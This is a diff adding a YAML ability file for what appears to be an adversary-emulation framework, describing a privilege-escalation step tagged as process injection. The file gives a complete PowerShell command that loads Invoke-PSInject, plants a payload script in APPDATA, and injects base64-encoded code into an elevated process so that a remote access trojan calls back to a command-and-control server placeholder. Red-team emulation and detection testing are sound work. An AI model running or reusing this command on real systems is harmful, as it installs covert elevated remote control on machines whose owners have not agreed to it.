@@ -1,0 +1,63 @@
+ability_id: 088b8639-3f37-42cc-9dc8-01aabb645461
+access: {}
+additional_info: {}
+buckets:
+- privilege-escalation
+delete_payload: true
+description: The limited functionality high-integrity RAT will inject malicious code
+  into an existing fully functional high-integrity process, resulting in a new elevated,
+  fully functional high-integrity RAT.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+
+    Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+
+    $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module
+    $env:APPDATA\update.ps1;update(''#{server}'')"));
+
+    Inject -PoshCode $pcode;'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - update.ps1
+  - Invoke-PSInject.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
+
+    Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
+
+    $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module
+    $env:APPDATA\update.ps1;update(''#{server}'')"));
+
+    Inject -PoshCode $pcode;'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - update.ps1
+  - Invoke-PSInject.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Process Injection
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: privilege-escalation
+technique_id: T1055
+technique_name: Process Injection
